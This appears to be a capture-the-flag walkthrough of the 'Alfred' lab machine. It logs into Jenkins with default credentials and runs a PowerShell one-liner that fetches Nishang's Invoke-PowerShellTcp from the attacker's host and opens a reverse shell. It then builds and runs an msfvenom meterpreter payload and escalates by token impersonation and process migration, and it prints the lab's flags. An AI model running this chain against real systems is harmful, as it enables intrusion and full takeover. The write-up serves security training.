# Alfred machine
### Silver Garc√≠a

## NMAP
```
sudo nmap -sV -p- -Pn 10.10.157.12
```

```
Host is up (0.16s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 346.35 seconds

```

**Credentials for login panel:** admin:admin

## Reverse shell
Reverse shell script: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

Feature that allows us to execute commands: http://10.10.157.12:8080/computer/(master)/script

Payload to get reverse shell:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.145.104:4545/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.145.104 -Port 4444
```

**user.txt flag at C:\Users\bruce\Desktop\uset.txt:** 79007a09481963edf2e1321abd9ae2a0

## Switchting shell

1.  Create payload
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=10.8.145.104 LPORT=5555 -f exe -o mamberroi.exe
```

2. Download file from target computer
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.145.104:8000/mamberroi.exe','mamberroi.exe')"
```

3. Start listener
```
multi/handler/meterpreter/reverse_tcp
```

4. Execute payload
```
Start-Process "mamberroi.exe"
```
## Privilege escalation
1. View privileges
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```
**SeImpersonatePrivilege IMPORTANT**

2. Load incognito
```
load incognito
```

3. List tokens
```
list_tokens -g
```

4. Impersonate token
```
impersonate_token "BUILTIN\Administrators"
```

5. Migrate to service.exe process
List processes
```
ps
```
```
Process List
============

 PID   PPID  Name        Arch  Session  User              Path
 ---   ----  ----        ----  -------  ----              ----
 0     0     [System Pr
             ocess]
 4     0     System      x64   0
 396   4     smss.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\System
                                        TEM               32\smss.exe
 524   516   csrss.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\System
                                        TEM               32\csrss.exe
 572   564   csrss.exe   x64   1        NT AUTHORITY\SYS  C:\Windows\System
                                        TEM               32\csrss.exe
 596   516   wininit.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\wininit.exe
 608   564   winlogon.e  x64   1        NT AUTHORITY\SYS  C:\Windows\System
             xe                         TEM               32\winlogon.exe
 668   596   services.e  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             xe                         TEM               32\services.exe
 676   596   lsass.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\System
                                        TEM               32\lsass.exe
 684   596   lsm.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\System
                                        TEM               32\lsm.exe
 772   668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\svchost.exe
 848   668   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\System
             e                          WORK SERVICE      32\svchost.exe
 920   608   LogonUI.ex  x64   1        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\LogonUI.exe
 936   668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\System
             e                          AL SERVICE        32\svchost.exe
 992   668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\svchost.exe
 1004  1808  powershell  x86   0        alfred\bruce      C:\Windows\SysWOW
             .exe                                         64\WindowsPowerSh
                                                          ell\v1.0\powershe
                                                          ll.exe
 1012  668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\System
             e                          AL SERVICE        32\svchost.exe
 1016  668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\svchost.exe
 1064  668   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\System
             e                          WORK SERVICE      32\svchost.exe
 1208  668   spoolsv.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\spoolsv.exe
 1236  668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\System
             e                          AL SERVICE        32\svchost.exe
 1340  668   amazon-ssm  x64   0        NT AUTHORITY\SYS  C:\Program Files\
             -agent.exe                 TEM               Amazon\SSM\amazon
                                                          -ssm-agent.exe
 1368  1004  powershell  x86   0        alfred\bruce      C:\Windows\SysWOW
             .exe                                         64\WindowsPowerSh
                                                          ell\v1.0\powershe
                                                          ll.exe
 1420  668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\svchost.exe
 1444  668   LiteAgent.  x64   0        NT AUTHORITY\SYS  C:\Program Files\
             exe                        TEM               Amazon\Xentools\L
                                                          iteAgent.exe
 1484  668   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\System
             e                          AL SERVICE        32\svchost.exe
 1576  668   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\System
             e                          WORK SERVICE      32\svchost.exe
 1608  668   jenkins.ex  x64   0        alfred\bruce      C:\Program Files
             e                                            (x86)\Jenkins\jen
                                                          kins.exe
 1700  668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\svchost.exe
 1808  1608  java.exe    x86   0        alfred\bruce      C:\Program Files
                                                          (x86)\Jenkins\jre
                                                          \bin\java.exe
 1832  668   Ec2Config.  x64   0        NT AUTHORITY\SYS  C:\Program Files\
             exe                        TEM               Amazon\Ec2ConfigS
                                                          ervice\Ec2Config.
                                                          exe
 1876  668   sppsvc.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
                                        WORK SERVICE      32\sppsvc.exe
 1920  524   conhost.ex  x64   0        alfred\bruce      C:\Windows\System
             e                                            32\conhost.exe
 2020  668   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\svchost.exe
 2284  668   TrustedIns  x64   0        NT AUTHORITY\SYS  C:\Windows\servic
             taller.exe                 TEM               ing\TrustedInstal
                                                          ler.exe
 2324  772   WmiPrvSE.e  x64   0        NT AUTHORITY\NET  C:\Windows\System
             xe                         WORK SERVICE      32\wbem\WmiPrvSE.
                                                          exe
 2396  524   conhost.ex  x64   0        alfred\bruce      C:\Windows\System
             e                                            32\conhost.exe
 2560  1808  powershell  x86   0        alfred\bruce      C:\Windows\SysWOW
             .exe                                         64\WindowsPowerSh
                                                          ell\v1.0\powershe
                                                          ll.exe
 2572  1808  powershell  x86   0        alfred\bruce      C:\Windows\SysWOW
             .exe                                         64\WindowsPowerSh
                                                          ell\v1.0\powershe
                                                          ll.exe
 2676  524   conhost.ex  x64   0        alfred\bruce      C:\Windows\System
             e                                            32\conhost.exe
 2916  668   SearchInde  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             xer.exe                    TEM               32\SearchIndexer.
                                                          exe
 3004  2572  mamberroi.  x86   0        alfred\bruce      C:\Users\bruce\De
             exe                                          sktop\mamberroi.e
                                                          xe
 3012  524   conhost.ex  x64   0        alfred\bruce      C:\Windows\System
             e                                            32\conhost.exe
```

Migrate
```
migrate 668
```

**User flat at C:\Windows\System32\config\root.txt:** dff0f748678f280250f25a45b8046b4a